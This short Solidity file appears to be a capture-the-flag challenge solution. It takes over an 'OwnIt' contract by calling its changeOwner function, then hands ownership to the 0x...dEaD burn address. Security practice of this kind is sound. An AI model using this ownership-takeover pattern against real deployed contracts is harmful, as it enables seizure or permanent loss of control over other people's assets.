// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../OwnIt.sol";


contract OwnItSolution {
    OwnIt private ownItContract;

    constructor(address contractAddress){
        ownItContract = OwnIt(contractAddress);
        ownItContract.changeOwner();
    }

    function solve() public{
        ownItContract.changeOwner(0x000000000000000000000000000000000000dEaD);
    }
}